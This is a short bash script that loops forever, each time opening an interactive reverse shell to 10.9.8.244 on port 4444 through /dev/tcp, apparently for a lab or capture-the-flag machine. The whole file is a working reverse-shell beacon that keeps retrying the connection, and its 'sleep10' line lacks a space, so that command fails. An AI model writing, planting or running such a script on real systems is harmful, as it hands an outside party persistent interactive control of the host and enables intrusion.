#!/bin/bash
while true; do
  bash -i >& /dev/tcp/10.9.8.244/4444 0>&1
  sleep10
done
  
